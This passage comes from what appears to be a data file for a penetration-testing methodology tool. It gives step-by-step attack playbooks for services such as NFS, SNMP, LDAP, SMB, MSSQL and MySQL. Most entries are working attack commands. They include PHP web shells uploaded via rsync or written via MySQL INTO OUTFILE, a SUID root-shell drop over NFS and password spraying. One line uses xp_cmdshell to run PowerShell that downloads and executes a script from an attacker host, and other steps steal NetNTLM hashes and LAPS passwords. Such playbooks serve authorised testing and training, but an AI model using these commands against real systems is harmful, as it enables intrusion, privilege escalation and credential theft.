        expected_output: ['* OK IMAP4rev1 Server Ready', '1 LOGIN {{USERNAME}} {{PASSWORD}}', '2 SELECT INBOX', '3 FETCH 1 BODY[]'],
        common_mistakes: ['Commands in IMAP require a tag prefix (e.g. `1 LOGIN`, `2 SELECT INBOX`).'],
        if_success: 'IMAP session established! Dump all user inboxes.',
        if_failure: 'Login rejected. Verify credentials.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap']
      }
    ]
  },

  // ==========================================
  // 11. NFS (Ports 111 / 2049)
  // ==========================================
  {
    id: 'nfs',
    name: 'NFS Network File System (Ports 111 / 2049)',
    category: 'network',
    description: 'Methodology for Network File System (NFS) on ports 111 and 2049. Covers showmount share discovery, mounting exports, no_root_squash privilege escalation, and SUID file drops.',
    port_triggers: [111, 2049],
    service_triggers: ['nfs', 'rpcbind'],
    tags: ['nfs', 'rpcbind', 'shares', 'privesc'],
    steps: [
      {
        id: 'nfs-showmount',
        title: 'Discover Available NFS Exports (showmount)',
        phase: 'reconnaissance',
        purpose: 'Query the NFS rpcbind daemon to discover all exported directory paths and client access permissions.',
        command: 'showmount -e {{TARGET}}',
        expected_output: ['Export list for {{TARGET}}:', '/var/backups (everyone)', '/home/developer *'],
        common_mistakes: ['If `showmount` fails, scan with `nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls {{TARGET}}`.'],
        if_success: 'NFS shares identified! Proceed to mount the exported directory locally.',
        if_failure: 'No exports shared or filtered. Check firewall rules.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting']
      },
      {
        id: 'nfs-mount-share',
        title: 'Mount Remote NFS Share Locally',
        phase: 'enumeration',
        purpose: 'Mount the target NFS export to a local directory to read source code, configuration files, and private SSH keys.',
        command: 'sudo mkdir -p /mnt/target_nfs && sudo mount -t nfs {{TARGET}}:/{{SHARE_NAME|var/backups}} /mnt/target_nfs -o nolock',
        expected_output: ['[NFS share mounted to /mnt/target_nfs]'],
        common_mistakes: ['Forgetting `-o nolock`; older NFS servers hang without nolock option over VPN.'],
        if_success: 'NFS mounted! Browse `/mnt/target_nfs` and search for id_rsa, database dumps, and credentials.',
        if_failure: 'Permission denied (access restricted by IP). Check other interfaces or subnet IPs.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting']
      },
      {
        id: 'nfs-root-squash-privesc',
        title: 'Privilege Escalation via no_root_squash SUID Drop',
        phase: 'privesc',
        purpose: 'If the share has `no_root_squash` enabled in `/etc/exports`, copy a bash binary from your local root account with SUID permissions to execute as root on the target.',
        command: 'sudo cp /bin/bash /mnt/target_nfs/rootbash && sudo chmod +s /mnt/target_nfs/rootbash',
        expected_output: ['-rwsr-sr-x 1 root root /mnt/target_nfs/rootbash'],
        common_mistakes: ['On the target machine, execute with `./rootbash -p` to preserve root SUID privileges.'],
        if_success: 'SUID binary written! On target run `/path/to/share/rootbash -p` for instant root shell.',
        if_failure: 'Root squashed (nobody:nogroup). Check for user UID spoofing (`useradd -u <target_uid>`).',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting']
      }
    ]
  },

  // ==========================================
  // 12. SNMP (Ports 161 / 162 UDP)
  // ==========================================
  {
    id: 'snmp',
    name: 'SNMP Enumeration & Process Mining (Ports 161 / 162 UDP)',
    category: 'network',
    description: 'Methodology for Simple Network Management Protocol (SNMP) on UDP ports 161 and 162. Covers community string bruteforcing, full MIB tree walking, process/command line disclosure, and NET-SNMP-EXTEND RCE.',
    port_triggers: [161, 162],
    service_triggers: ['snmp'],
    tags: ['snmp', 'udp', 'recon', 'enumeration', 'rce'],
    steps: [
      {
        id: 'snmp-brute-community',
        title: 'SNMP Community String Bruteforce (onesixtyone)',
        phase: 'reconnaissance',
        purpose: 'Bruteforce valid read-only and read-write community strings (public, private, manager).',
        command: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-strings.txt {{TARGET}}',
        expected_output: ['{{TARGET}} [public] Linux target 5.4.0-42-generic #46-Ubuntu...'],
        common_mistakes: ['SNMP is UDP; ensure UDP port 161 is reachable.'],
        if_success: 'Valid community string found! Run full snmpwalk.',
        if_failure: 'No community string match. Try company name as custom string.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp']
      },
      {
        id: 'snmp-snmpwalk-processes',
        title: 'SNMP Full Walk & Running Process Inspection',
        phase: 'enumeration',
        purpose: 'Walk the MIB tree to extract running processes, command lines (often containing passwords), network interfaces, and installed software.',
        command: 'snmpwalk -v2c -c {{COMMUNITY|public}} {{TARGET}} hrSWRunPath && snmpwalk -v2c -c {{COMMUNITY|public}} {{TARGET}} hrSWRunParameters',
        expected_output: ['hrSWRunPath.120 = STRING: "/usr/bin/python3"', 'hrSWRunParameters.120 = STRING: "/opt/backup.py --password SuperSecretPass"'],
        common_mistakes: ['`snmpwalk` output is massive; redirect to a file: `snmpwalk -v2c -c public {{TARGET}} > snmp.txt`.'],
        if_success: 'Discovered processes and credentials in command-line arguments!',
        if_failure: 'Standard MIBs empty. Check NET-SNMP custom extensions.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp']
      },
      {
        id: 'snmp-extend-rce',
        title: 'NET-SNMP-EXTEND Command Execution',
        phase: 'exploitation',
        purpose: 'If read-write community string is known, or custom NET-SNMP extensions are configured, query extensions for command output.',
        command: 'snmpwalk -v2c -c {{COMMUNITY|public}} {{TARGET}} NET-SNMP-EXTEND-MIB::nsExtendObjects',
        expected_output: ['nsExtendOutputFull.6.115.104.101.108.108 = STRING: root'],
        common_mistakes: ['Requires NET-SNMP daemon configured with `extend` directives in `/etc/snmp/snmpd.conf`.'],
        if_success: 'Command output extracted via SNMP! Check for writable SNMP configurations.',
        if_failure: 'No extend objects. Proceed to user credential triage.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp']
      }
    ]
  },

  // ==========================================
  // 13. LDAP (Port 389 / 636)
  // ==========================================
  {
    id: 'ldap',
    name: 'LDAP & Active Directory Reconnaissance (Port 389 / 636)',
    category: 'network',
    description: 'Comprehensive methodology for Lightweight Directory Access Protocol (LDAP) on ports 389, 636, and 3268. Covers anonymous RootDSE, domain dumps, password in descriptions, LAPS, and BloodHound.',
    port_triggers: [389, 636, 3268],
    service_triggers: ['ldap', 'ldaps'],
    tags: ['ldap', 'active-directory', 'bloodhound', 'laps', 'recon'],
    steps: [
      {
        id: 'ldap-root-dse',
        title: 'LDAP Anonymous RootDSE Query',
        phase: 'reconnaissance',
        purpose: 'Query the LDAP RootDSE unauthenticated to discover domain naming contexts, domain functional level, and Forest configuration.',
        command: 'ldapsearch -H ldap://{{TARGET}} -x -s base namingcontexts',
        expected_output: ['namingContexts: DC=corp,DC=local', 'namingContexts: CN=Configuration,DC=corp,DC=local'],
        common_mistakes: ['Not specifying `-x` for simple anonymous authentication.'],
        if_success: 'Identified Base DN (`DC=corp,DC=local`). Proceed to anonymous object dump.',
        if_failure: 'Anonymous RootDSE disabled. Try authenticated query with discovered credentials.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ldap-anon-dump',
        title: 'Anonymous LDAP Domain Object Dump',
        phase: 'enumeration',
        purpose: 'Dump all readable domain objects (users, computers, groups, GPOs) to HTML tables using ldapdomaindump.',
        command: "ldapdomaindump -u '' -p '' -o ./ldap_loot {{TARGET}}",
        expected_output: ['[*] Dumping domain...', '[*] Found 25 users', '[*] Generated domain_users.html'],
        common_mistakes: ['Not inspecting `domain_users.html` for password notes written in user description fields.'],
        if_success: 'Domain dumped! Inspect `domain_users.html` and `domain_groups.html` in browser.',
        if_failure: 'Anonymous binding disabled. Use authenticated NetExec LDAP queries.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ldap-user-descriptions',
        title: 'Search Passwords in LDAP User Descriptions',
        phase: 'enumeration',
        purpose: 'Search all Active Directory user accounts for descriptions containing plaintext passwords, API keys, or onboarding notes.',
        command: "netexec ldap {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M get-desc-users",
        expected_output: ['[+] User: jdoe | Description: Password set to Summer2024! during onboarding'],
        common_mistakes: ['Skipping computer account descriptions; service account passwords are often stored there.'],
        if_success: 'Discovered plaintext credential! Test credential against SMB, WinRM, and SSH.',
        if_failure: 'No passwords in descriptions. Proceed to LAPS or BloodHound collection.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ldap-laps-dump',
        title: 'Extract LAPS Local Administrator Passwords',
        phase: 'exploitation',
        purpose: 'Query Active Directory for Local Administrator Password Solution (`ms-Mcs-AdmPwd`) attributes to retrieve cleartext local admin passwords.',
        command: "netexec ldap {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M laps",
        expected_output: ['[+] Computer: WORKSTATION01$ | LAPS Password: K8!mP9#qZ2'],
        common_mistakes: ['User must have Read permissions on LAPS attributes; usually Delegated Admins or HelpDesk.'],
        if_success: 'LAPS Administrator password recovered! Use WinRM/SMB to login as local Administrator.',
        if_failure: 'Access Denied on LAPS attributes. Proceed to BloodHound attack path mapping.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ldap-bloodhound-collect',
        title: 'BloodHound Active Directory Graph Ingestion',
        phase: 'enumeration',
        purpose: 'Collect the complete Active Directory database (users, groups, sessions, ACLs, GPOs, trusts) for visualization in BloodHound.',
        command: "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d {{DOMAIN|corp.local}} -dc {{TARGET}} -c All --zip",
        expected_output: ['[*] Progress: 100%', '[*] Output file: 20240320_bloodhound.zip'],
        common_mistakes: ['Using an unresolvable domain name; ensure `{{DOMAIN}}` points to `{{TARGET}}` in `/etc/hosts`.'],
        if_success: 'BloodHound data collected! Import zip into BloodHound and check "Shortest Paths to Domain Admins".',
        if_failure: 'Kerberos authentication issue. Ensure system time is synchronized with DC.',
        references: ['https://wadcoms.github.io/']
      }
    ]
  },

  // ==========================================
  // 14. IPMI (Port 623 UDP)
  // ==========================================
  {
    id: 'ipmi',
    name: 'IPMI Baseboard Management Controller (Port 623 UDP)',
    category: 'network',
    description: 'Methodology for Intelligent Platform Management Interface (IPMI / iDRAC / iLO) on UDP port 623. Covers RAKP 2.0 flaw hash dumping and Hashcat mode 7300 cracking.',
    port_triggers: [623],
    service_triggers: ['ipmi', 'asf-rmcp'],
    tags: ['ipmi', 'idrac', 'ilo', 'rakp', 'passwords'],
    steps: [
      {
        id: 'ipmi-version-scan',
        title: 'IPMI Version & BMC Detection',
        phase: 'reconnaissance',
        purpose: 'Query the BMC (Baseboard Management Controller) to determine IPMI version (1.5 / 2.0) and vendor (Dell iDRAC / HP iLO / Supermicro).',
        command: 'nmap -sU --script ipmi-version -p 623 {{TARGET}}',
        expected_output: ['| ipmi-version: IPMI-2.0, Dell iDRAC9, UserAuth: password, kgHash: default'],
        common_mistakes: ['IPMI runs on UDP; use `nmap -sU`.'],
        if_success: 'IPMI 2.0 detected! Proceed to RAKP hash dumping.',
        if_failure: 'Port closed or not IPMI. Check other services.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi']
      },
      {
        id: 'ipmi-dump-hashes',
        title: 'Dump RAKP User Hashes (Metasploit)',
        phase: 'exploitation',
        purpose: 'Exploit the IPMI 2.0 RAKP protocol flaw to request password verification hashes for any username without authentication.',
        command: 'msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{TARGET}}; run; exit"',
        expected_output: ['[+] {{TARGET}}:623 - Hash found: admin:4a8f9c...:83e01...'],
        common_mistakes: ['Test common default BMC accounts: `root`, `ADMIN`, `Administrator`, `calvin`.'],
        if_success: 'RAKP hash dumped! Crack with Hashcat mode 7300: `hashcat -m 7300 ipmi.hashes rockyou.txt -O`.',
        if_failure: 'RAKP flaw mitigated. Test default vendor passwords: `root:calvin` (Dell) or `ADMIN:ADMIN` (Supermicro).',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi']
      }
    ]
  },

  // ==========================================
  // 15. RSYNC (Port 873)
  // ==========================================
  {
    id: 'rsync',
    name: 'Rsync Remote Synchronization (Port 873)',
    category: 'network',
    description: 'Methodology for Rsync daemon on port 873. Covers unauthenticated module enumeration, recursive file downloads, and web shell uploads.',
    port_triggers: [873],
    service_triggers: ['rsync'],
    tags: ['rsync', 'file-transfer', 'recon', 'upload'],
    steps: [
      {
        id: 'rsync-list-modules',
        title: 'Enumerate Accessible Rsync Modules',
        phase: 'reconnaissance',
        purpose: 'Connect to the Rsync daemon to list all exported shared modules and directory paths without authentication.',
        command: 'rsync -av --list-only rsync://{{TARGET}}/',
        expected_output: ['backups        Daily system backups', 'www            Web application root'],
        common_mistakes: ['If standard CLI hangs, test with `nc -nv {{TARGET}} 873` to verify protocol greeting.'],
        if_success: 'Accessible modules found! Proceed to download files or upload web shells.',
        if_failure: 'Authentication required. Test with candidate credentials.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync']
      },
      {
        id: 'rsync-download-module',
        title: 'Download Remote Rsync Module Files',
        phase: 'enumeration',
        purpose: 'Download all files and subdirectories from an open Rsync module to your local attacking machine.',
        command: 'rsync -av rsync://{{TARGET}}/{{MODULE_NAME|backups}} ./rsync_loot/',
        expected_output: ['receiving incremental file list', 'backup.tar.gz', 'id_rsa', 'sent 120 bytes  received 1.45M bytes'],
        common_mistakes: ['Inspect downloaded archives for `.env`, `id_rsa`, and database passwords.'],
        if_success: 'Files downloaded! Inspect contents for credentials.',
        if_failure: 'Read access denied. Test write access.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync']
      },
      {
        id: 'rsync-upload-webshell',
        title: 'Upload Web Shell via Writable Rsync Module',
        phase: 'exploitation',
        purpose: 'If the `www` or `html` module has write permissions, upload a PHP web shell to obtain remote code execution.',
        command: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && rsync -av shell.php rsync://{{TARGET}}/{{MODULE_NAME|www}}/shell.php",
        expected_output: ['shell.php', 'sent 180 bytes  received 35 bytes'],
        common_mistakes: ['Verify which web port (80/443/8080) maps to the uploaded web directory.'],
        if_success: 'Web shell uploaded! Execute commands via `curl "{{TARGET_URL}}/shell.php?cmd=whoami"`.',
        if_failure: 'Permission denied (read-only module).',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync']
      }
    ]
  },

  // ==========================================
  // 16. SMB (Port 139 / 445)
  // ==========================================
  {
    id: 'smb',
    name: 'SMB Enumeration & Assessment (Port 139 / 445)',
    category: 'network',
    description: 'Complete methodology for Server Message Block (SMB / Samba) on ports 139 and 445. Covers anonymous null sessions, share enumeration, RID cycling, password spraying, and PsExec.',
    port_triggers: [139, 445],
    service_triggers: ['smb', 'microsoft-ds', 'netbios-ssn'],
    tags: ['smb', 'samba', 'active-directory', 'network'],
    steps: [
      {
        id: 'smb-version-check',
        title: 'SMB Version & Signing Fingerprint (NetExec)',
        phase: 'reconnaissance',
        purpose: 'Identify the exact SMB protocol version, operating system release, build number, domain name, and whether SMB signing is required or enabled.',
        command: 'netexec smb {{TARGET}}',
        expected_output: ['[*] SMB {{TARGET}} 445 [HOSTNAME] [*] Windows 10.0 Build 19041 x64 (domain:CORP.LOCAL) (signing:False) (SMBv1:False)'],
        common_mistakes: ['Skipping host resolution when targeting Active Directory domain controllers.'],
        if_success: 'Identified OS build and signing status. If `signing:False`, target is vulnerable to NTLM Relay attacks.',
        if_failure: 'Connection refused. Check firewall rules or port forwarding.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      },
      {
        id: 'smb-null-session',
        title: 'SMB Null / Anonymous Share Enumeration',
        phase: 'enumeration',
        purpose: 'Test if the target permits unauthenticated (null session) connections or allows guest access without supplying valid credentials.',
        command: "netexec smb {{TARGET}} -u '' -p '' --shares",
        expected_output: ['[+] \\\\{{TARGET}}\\IPC$ READ', '[+] \\\\{{TARGET}}\\public READ, WRITE', '[-] \\\\{{TARGET}}\\C$ (Access Denied)'],
        common_mistakes: ['Forgetting to test both null session (empty user/pass) and guest account (user `guest` with no password).'],
        if_success: 'Readable shares found! Download share contents and search for credentials.',
        if_failure: 'Null session rejected. Proceed to RID user enumeration or password spraying.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      },
      {
        id: 'smb-rid-brute',
        title: 'User Enumeration via RID Cycling',
        phase: 'enumeration',
        purpose: 'Query relative identifiers (RIDs) over SMB/RPC to systematically discover domain or local usernames and SIDs without knowing full accounts in advance.',
        command: "netexec smb {{TARGET}} -u '{{USERNAME|guest}}' -p '{{PASSWORD|}}' --rid-brute 10000",
        expected_output: ['[*] 500: DOMAIN\\Administrator (SidTypeUser)', '[*] 1104: DOMAIN\\svc-sql (SidTypeUser)', '[*] 1105: DOMAIN\\jdoe (SidTypeUser)'],
        common_mistakes: ['Not starting from RID 500 (Administrator) or stopping before reaching custom service accounts (RID 1000-2000).'],
        if_success: 'Usernames discovered! Save to `users.txt` for password spraying and AS-REP Roasting.',
        if_failure: 'Access denied on RPC endpoint. Check web or LDAP enumeration for user lists.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      },
      {
        id: 'smb-share-spider',
        title: 'Recursive Share Inspection & Download',
        phase: 'enumeration',
        purpose: 'Connect to readable shares and spider file names, looking for configuration files, backup archives, scripts, or credentials.',
        command: "smbclient //{{TARGET}}/{{SHARE_NAME|public}} -N -c 'recurse;ls'",
        expected_output: ['.\\backup\\config.ini', '.\\scripts\\deploy.ps1', '.\\passwords.kdbx'],
        common_mistakes: ['Using forward slashes in smbclient commands when interacting with nested Windows paths.'],
        if_success: 'Sensitive files located! Download with `smbclient //{{TARGET}}/{{SHARE}} -N -c "get passwords.kdbx"`.',
        if_failure: 'No files found on public shares. Proceed to authenticated spraying.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      },
      {
        id: 'smb-pass-spray',
        title: 'SMB Password Spraying',
        phase: 'exploitation',
        purpose: 'Test a single password or default credential against all discovered user accounts.',
        command: "netexec smb {{TARGET}} -u users.txt -p '{{PASSWORD|Summer2024!}}' --continue-on-success",
        expected_output: ['[+] DOMAIN\\jdoe:Summer2024! (Pwn3d!)', '[-] DOMAIN\\admin:Summer2024! (STATUS_LOGON_FAILURE)'],
        common_mistakes: ['Spraying passwords too fast and triggering account lockout thresholds.'],
        if_success: 'Valid credentials! If marked `(Pwn3d!)`, you have Local Admin rights: proceed to PsExec / WMIExec.',
        if_failure: 'Password spray returned 0 hits. Try alternate passwords or seasonal patterns.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      },
      {
        id: 'smb-psexec-shell',
        title: 'Remote Command Execution via PsExec',
        phase: 'exploitation',
        purpose: 'Spawn an interactive NT AUTHORITY\\SYSTEM shell over SMB using administrative credentials.',
        command: "impacket-psexec '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}'",
        expected_output: ['[*] Requesting shares on {{TARGET}}...', '[*] Found writable share ADMIN$', '[*] Opening interactive shell... C:\\Windows\\system32>'],
        common_mistakes: ['Requires Local Admin rights and write access to ADMIN$ or C$ share.'],
        if_success: 'SYSTEM shell acquired! Dump local SAM/LSA secrets and capture root flag.',
        if_failure: 'ADMIN$ share not writable. Try `impacket-wmiexec` or `evil-winrm` instead.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb']
      }
    ]
  },

  // ==========================================
  // 17. MSSQL (Port 1433 / 1434)
  // ==========================================
  {
    id: 'mssql',
    name: 'MSSQL Database Exploitation (Port 1433)',
    category: 'network',
    description: 'Comprehensive methodology for Microsoft SQL Server on port 1433. Covers authentication probes, interactive SQL shells, enabling xp_cmdshell RCE, linked servers, and NetNTLM hash stealing.',
    port_triggers: [1433, 1434],
    service_triggers: ['mssql', 'ms-sql-s'],
    tags: ['mssql', 'database', 'rce', 'xp_cmdshell'],
    steps: [
      {
        id: 'mssql-auth-probe',
        title: 'MSSQL Authentication Probe (NetExec)',
        phase: 'reconnaissance',
        purpose: 'Validate MSSQL credentials and verify if the user has `sysadmin` administrative privileges on the database instance.',
        command: "netexec mssql {{TARGET}} -u '{{USERNAME|sa}}' -p '{{PASSWORD}}'",
        expected_output: ['[+] MSSQL {{TARGET}}:1433 [*] Microsoft SQL Server 2019 (name:SQL01) (Pwn3d!)'],
        common_mistakes: ['Not testing Windows Authentication (`-d {{DOMAIN}} --windows-auth`) vs SQL Server Authentication.'],
        if_success: 'MSSQL Authentication valid! If marked `(Pwn3d!)`, you have sysadmin rights to execute xp_cmdshell.',
        if_failure: 'Login failed. Try `sa` with empty password or test default application passwords.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server']
      },
      {
        id: 'mssql-interactive-shell',
        title: 'Interactive MSSQL Client Shell (impacket-mssqlclient)',
        phase: 'enumeration',
        purpose: 'Connect to the MSSQL instance to execute direct Transact-SQL queries, inspect database tables, and enumerate database links.',
        command: "impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth",
        expected_output: ['[*] Database: master', 'SQL (corp\\sa  guest@master)>'],
        common_mistakes: ['Omitting `-windows-auth` when using Active Directory domain credentials.'],
        if_success: 'Connected to MSSQL prompt! Run `SELECT @@version;` and check sysadmin role membership.',
        if_failure: 'Connection rejected. Verify domain context or SQL Server Auth format.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server']
      },
      {
        id: 'mssql-xp-cmdshell',
        title: 'Enable and Execute xp_cmdshell for Remote Code Execution',
        phase: 'exploitation',
        purpose: 'Reconfigure MSSQL to enable `xp_cmdshell` and execute operating system commands under the MSSQL service account context.',
        command: "impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth -c 'EXEC sp_configure \"show advanced options\", 1; RECONFIGURE; EXEC sp_configure \"xp_cmdshell\", 1; RECONFIGURE; xp_cmdshell \"whoami\";'",
        expected_output: ['output', '----------------', 'nt service\\mssqlserver', 'NULL'],
        common_mistakes: ['User must have `sysadmin` role or EXECUTE permission on `xp_cmdshell` stored procedure.'],
        if_success: 'Command executed! Spawn a reverse shell: `xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString(\'http://{{LHOST|10.10.14.2}}:8000/shell.ps1\')"`',
        if_failure: 'Permission denied on sp_configure. Try stealing NetNTLMv2 hash with xp_dirtree.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server']
      },
      {
        id: 'mssql-steal-netntlm',
        title: 'Steal NetNTLMv2 Hash via xp_dirtree (Responder)',
        phase: 'exploitation',
        purpose: 'Force the MSSQL service account to authenticate against your Responder SMB listener by requesting an SMB share path via `xp_dirtree`.',
        command: "impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth -c 'EXEC master..xp_dirtree \"\\\\{{LHOST|10.10.14.2}}\\share\", 1, 1;'",
        expected_output: ['[*] Responder [SMB] NTLMv2-SSP Client: {{TARGET}}', '[*] Hash: mssql-svc::CORP:...'],
        common_mistakes: ['Starting the command before running `sudo responder -I tun0 -v` on your Kali machine.'],
        if_success: 'NetNTLMv2 hash captured in Responder! Crack with Hashcat mode 5600.',
        if_failure: 'Outbound SMB blocked by firewall. Check internal linked database servers.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server']
      }
    ]
  },

  // ==========================================
  // 18. ORACLE TNS (Port 1521)
  // ==========================================
  {
    id: 'oracle-tns',
    name: 'Oracle TNS Database Exploitation (Port 1521)',
    category: 'network',
    description: 'Methodology for Oracle Database TNS listener on port 1521. Covers SID enumeration (ODAT), default credential attacks, and database code execution.',
    port_triggers: [1521],
    service_triggers: ['oracle-tns', 'oracle'],
    tags: ['oracle', 'tns', 'odat', 'database'],
    steps: [
      {
        id: 'oracle-sid-enum',
        title: 'Oracle SID Enumeration (ODAT)',
        phase: 'reconnaissance',
        purpose: 'Enumerate valid Oracle System Identifiers (SIDs e.g. XE, ORCL, PROD) required to authenticate to the database.',
        command: 'odat sidguesser -s {{TARGET}} -p 1521',
        expected_output: ['[+] Valid SIDs found: XE, ORCL'],
        common_mistakes: ['Without a valid SID, login attempts with sqlplus will fail.'],
        if_success: 'SID found! Proceed to password guessing with ODAT.',
        if_failure: 'SID guesser returned 0 results. Try Metasploit `auxiliary/scanner/oracle/sid_enum`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener']
      },
      {
        id: 'oracle-password-guess',
        title: 'Oracle Default Credential Guessing',
        phase: 'enumeration',
        purpose: 'Test default Oracle database accounts (scott/tiger, sys/change_on_install, system/manager) against discovered SIDs.',
        command: 'odat passwordguesser -s {{TARGET}} -p 1521 -d {{ORACLE_SID|XE}}',
        expected_output: ['[+] Valid credentials found on {{ORACLE_SID}}: scott/tiger (Normal), sys/change_on_install (SYSDBA)'],
        common_mistakes: ['Administrative logins often require the `as sysdba` flag.'],
        if_success: 'Valid credentials found! Connect with SQL*Plus: `sqlplus {{USERNAME}}/{{PASSWORD}}@{{TARGET}}:1521/{{ORACLE_SID}} as sysdba`.',
        if_failure: 'Default accounts disabled. Run `odat all -s {{TARGET}} -d {{ORACLE_SID}}` for full module audit.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener']
      }
    ]
  },

  // ==========================================
  // 19. MYSQL / MARIADB (Port 3306)
  // ==========================================
  {
    id: 'mysql',
    name: 'MySQL / MariaDB Database Exploitation (Port 3306)',
    category: 'network',
    description: 'Methodology for MySQL and MariaDB database on port 3306. Covers version scanning, remote connection, dumping password hashes, and dropping web shells via INTO OUTFILE.',
    port_triggers: [3306],
    service_triggers: ['mysql', 'mariadb'],
    tags: ['mysql', 'mariadb', 'database', 'into-outfile'],
    steps: [
      {
        id: 'mysql-nmap-auth',
        title: 'MySQL Version & Empty Root Password Check',
        phase: 'reconnaissance',
        purpose: 'Scan MySQL on port 3306 to retrieve server version, verify remote connection permissions, and check for blank root passwords.',
        command: 'nmap -p 3306 --script mysql-enum,mysql-info,mysql-empty-password -sV {{TARGET}}',
        expected_output: ['| mysql-info: Protocol: 10, Version: 10.3.27-MariaDB', '| mysql-empty-password: root account has empty password!'],
        common_mistakes: ['By default MySQL only binds to 127.0.0.1; if exposed externally, check for default `root` or `admin` accounts.'],
        if_success: 'Remote access permitted! Connect using MySQL CLI.',
        if_failure: 'Connection rejected (Host is not allowed to connect). Look for SQLi or local port forwarding.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql']
      },
      {
        id: 'mysql-dump-hashes',
        title: 'MySQL Database & User Hash Extraction',
        phase: 'enumeration',
        purpose: 'Connect to the database, list all available databases, and dump password hashes from `mysql.user`.',
        command: "mysql -u '{{USERNAME|root}}' -p'{{PASSWORD}}' -h {{TARGET}} -e 'SHOW DATABASES; SELECT user, host, authentication_string FROM mysql.user;'",
        expected_output: ['| root | % | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |', '| app_user | localhost | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |'],
        common_mistakes: ['MySQL 5.7+ uses `authentication_string` column instead of legacy `password`.'],
        if_success: 'Hashes extracted! Crack MySQL hashes with Hashcat mode 300: `hashcat -m 300 mysql.hashes rockyou.txt`.',
        if_failure: 'Access denied. Check web application configuration files for hardcoded database credentials.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql']
      },
      {
        id: 'mysql-into-outfile',
        title: 'Web Shell Drop via INTO OUTFILE',
        phase: 'exploitation',
        purpose: 'If MySQL user has FILE privilege and webroot path is known, write a PHP web shell directly into `/var/www/html/`.',
        command: "mysql -u '{{USERNAME|root}}' -p'{{PASSWORD}}' -h {{TARGET}} -e \"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"",
        expected_output: ['Query OK, 1 row affected (0.01 sec)'],
        common_mistakes: ['Requires `secure_file_priv` to be empty in MySQL server configuration (`SELECT @@secure_file_priv;`).'],
        if_success: 'Web shell written! Trigger commands via `curl "{{TARGET_URL}}/shell.php?cmd=id"`.',
        if_failure: 'secure_file_priv restriction or directory not writable. Read files with `LOAD_FILE("/etc/passwd")`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql']
      }
    ]
  },

  // ==========================================
  // 20. RDP (Port 3389)
  // ==========================================
  {
    id: 'rdp',
    name: 'Remote Desktop Protocol (RDP - Port 3389)',
    category: 'network',
    description: 'Methodology for RDP on port 3389. Covers security settings checks (rdp-sec-check), xfreerdp high-fidelity connections with local drive mounts, and Pass-the-Hash over RDP (Restricted Admin).',
    port_triggers: [3389],
    service_triggers: ['rdp', 'ms-wbt-server'],
    tags: ['rdp', 'remote-desktop', 'windows', 'gui'],
    steps: [
      {
        id: 'rdp-sec-check',
        title: 'RDP Security Standards & NLA Audit',
        phase: 'reconnaissance',
        purpose: 'Inspect supported encryption protocols (Standard RDP, SSL/TLS, CredSSP/NLA) and check for BlueKeep vulnerability.',
        command: 'nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -sV {{TARGET}}',
        expected_output: ['| rdp-enum-encryption: Native RDP: SUCCESS, SSL: SUCCESS', '| rdp-ntlm-info: Target_Name: CORP, NetBIOS_Domain_Name: CORP'],
        common_mistakes: ['If NLA (Network Level Authentication) is disabled, target might be vulnerable to older RDP exploits.'],
